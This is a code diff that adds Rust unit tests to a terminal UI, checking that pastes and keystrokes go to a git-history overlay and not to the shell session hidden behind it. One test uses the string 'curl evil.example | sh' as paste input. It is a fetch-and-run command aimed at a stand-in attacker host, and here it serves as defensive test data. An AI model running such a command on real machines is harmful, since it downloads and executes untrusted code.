@@ -191,7 +191,8 @@ impl App {
 mod tests {
     use super::*;
 
-    use crate::conn::{Conn, Ev};
+    use crate::conn::{Cmd, Conn, Ev};
+    use crate::{CtKey, KeyCode, KeyModifiers};
 
     /// A minimal `App`. The connection actor is pointed at a socket path that
     /// does not exist: it fails to connect, reports `Ev::Down` into a channel
@@ -252,6 +253,86 @@ mod tests {
             dirty: true,
             quit: false,
         }
+    }
+
+    /// `test_app()` with its command channel intercepted, so a test can ask
+    /// what — if anything — was sent on to the session. The spawned actor's
+    /// sender is dropped, which is how that thread learns to stop.
+    fn app_watching_commands() -> (App, tokio::sync::mpsc::UnboundedReceiver<Cmd>) {
+        let mut app = test_app();
+        let (cmd_tx, cmd_rx) = tokio::sync::mpsc::unbounded_channel();
+        app.conn = Conn { cmd_tx };
+        (app, cmd_rx)
+    }
+
+    /// A throwaway repository with a little history, so an overlay opened on
+    /// it has rows a key can actually move through. Built here rather than
+    /// borrowed from `asd-git`, whose fixture is `#[cfg(test)]`-private to
+    /// that crate, and used in preference to whatever repository the test
+    /// runner happens to be sitting in so these tests cannot silently skip.
+    struct ScratchRepo(PathBuf);
+
+    impl ScratchRepo {
+        fn new(tag: &str) -> Self {
+            let dir = std::env::temp_dir().join(format!(
+                "asd-tui-overlay-{tag}-{}-{}",
+                std::process::id(),
+                std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap()
+                    .as_nanos()
+            ));
+            std::fs::create_dir_all(&dir).unwrap();
+            let me = Self(dir);
+            me.git(&["init", "--quiet", "--initial-branch=main"]);
+            me.git(&["config", "user.name", "asd test"]);
+            me.git(&["config", "user.email", "test@example.invalid"]);
+            me.git(&["config", "commit.gpgsign", "false"]);
+            for i in 0..3 {
+                let message = format!("commit {i}");
+                me.git(&["commit", "--quiet", "--allow-empty", "-m", &message]);
+            }
+            me
+        }
+
+        fn path(&self) -> &Path {
+            &self.0
+        }
+
+        /// Run git with a fixed identity and clock, so nothing depends on the
+        /// host's git config or on how fast the machine runs `git`.
+        fn git(&self, args: &[&str]) {
+            let out = std::process::Command::new("git")
+                .args(args)
+                .current_dir(&self.0)
+                .env("GIT_AUTHOR_DATE", "1700000000 +0000")
+                .env("GIT_COMMITTER_DATE", "1700000000 +0000")
+                .env("GIT_CONFIG_NOSYSTEM", "1")
+                .env("HOME", &self.0)
+                .output()
+                .unwrap_or_else(|e| panic!("running git {args:?}: {e}"));
+            assert!(
+                out.status.success(),
+                "git {args:?}: {}",
+                String::from_utf8_lossy(&out.stderr)
+            );
+        }
+    }
+
+    impl Drop for ScratchRepo {
+        fn drop(&mut self) {
+            std::fs::remove_dir_all(&self.0).ok();
+        }
+    }
+
+    /// An app with the overlay open on a real repository.
+    fn app_with_overlay(
+        tag: &str,
+    ) -> (ScratchRepo, App, tokio::sync::mpsc::UnboundedReceiver<Cmd>) {
+        let repo = ScratchRepo::new(tag);
+        let (mut app, cmds) = app_watching_commands();
+        app.git_graph = Some(GitGraph::open(repo.path()).expect("a fresh repository opens"));
+        (repo, app, cmds)
     }
 
     fn session(name: &str, pid: u32) -> asd_proto::SessionInfo {
@@ -351,5 +432,68 @@ mod tests {
             "the message names the path: {msg}"
         );
         std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn a_paste_cannot_reach_the_session_behind_the_overlay() {
+        // The failure mode this guards is typing into the wrong shell: with
+        // the overlay up, the session underneath is invisible, and a pasted
+        // command or token would sit in its input buffer waiting for the next
+        // Enter. The key path and the mouse path both stop at the overlay;
+        // the paste path has to as well.
+        let (_repo, mut app, mut cmds) = app_with_overlay("paste-blocked");
+        app.scroll = 7;
+
+        app.on_paste("curl evil.example | sh\n");
+
+        match cmds.try_recv() {
+            Err(_) => {}
+            Ok(cmd) => panic!("a paste reached the session behind the overlay: {cmd:?}"),
+        }
+        assert_eq!(
+            app.scroll, 7,
+            "and it does not silently un-scroll the hidden pane either"
+        );
+        assert!(app.git_graph.is_some(), "the overlay stays open");
+    }
+
+    #[test]
+    fn a_paste_with_nothing_on_top_still_reaches_the_session() {
+        // The control for the test above: without it, blocking every paste
+        // everywhere would pass just as well.
+        let (mut app, mut cmds) = app_watching_commands();
+        app.scroll = 7;
+
+        app.on_paste("echo hello");
+
+        match cmds.try_recv() {
+            Ok(Cmd::Input(bytes)) => assert_eq!(bytes, b"echo hello"),
+            other => panic!("an unobstructed paste is session input: {other:?}"),
+        }
+        assert_eq!(app.scroll, 0, "and it jumps the pane back to live");
+    }
+
+    #[test]
+    fn an_ordinary_key_goes_to_the_overlay_and_not_to_the_session() {
+        // `j` is a navigation key for the overlay and an ordinary byte for a
+        // shell. While the overlay is up it must be the former only.
+        let (_repo, mut app, mut cmds) = app_with_overlay("key-routed");
+        assert_eq!(
+            app.git_graph.as_ref().unwrap().selected(),
+            0,
+            "the newest commit starts selected"
+        );
+
+        app.on_key(CtKey::new(KeyCode::Char('j'), KeyModifiers::NONE));
+
+        assert_eq!(
+            app.git_graph.as_ref().unwrap().selected(),
+            1,
+            "the overlay moved its selection"
+        );
+        match cmds.try_recv() {
+            Err(_) => {}
+            Ok(cmd) => panic!("the key also reached the session: {cmd:?}"),
+        }
     }
 }
